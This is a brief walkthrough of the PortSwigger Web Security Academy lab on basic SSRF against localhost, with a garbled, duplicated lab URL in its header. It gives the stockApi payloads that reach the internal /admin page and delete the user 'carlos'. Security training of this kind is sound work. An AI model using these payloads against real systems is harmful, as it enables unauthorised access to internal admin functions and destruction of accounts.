# Lab: Basic SSRF against the local server
# https://portswigger.net/web-security/learning-pathhttps://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-common-ssrf-attacks/ssrf/lab-basic-ssrf-against-localhost#s/ssrf-attacks/ssrf-attacks-common-ssrf-attacks/ssrf/lab-basic-ssrf-against-localhost#
```bash
# Send the stock request to repeater update the code and send request.

stockApi=http://localhost/admin

# Response:
<span>carlos - </span>
<a href="/admin/delete?username=carlos">Delete

```

```bash
# You can render response from burp and delete carlos or you can right click and show response on browser to delete carlos. 
# There is 1 more way to delete carlos thats:

stockApi=http://localhost/admin/delete?username=carlos

# Send the request and it carlos will be deleted.
```
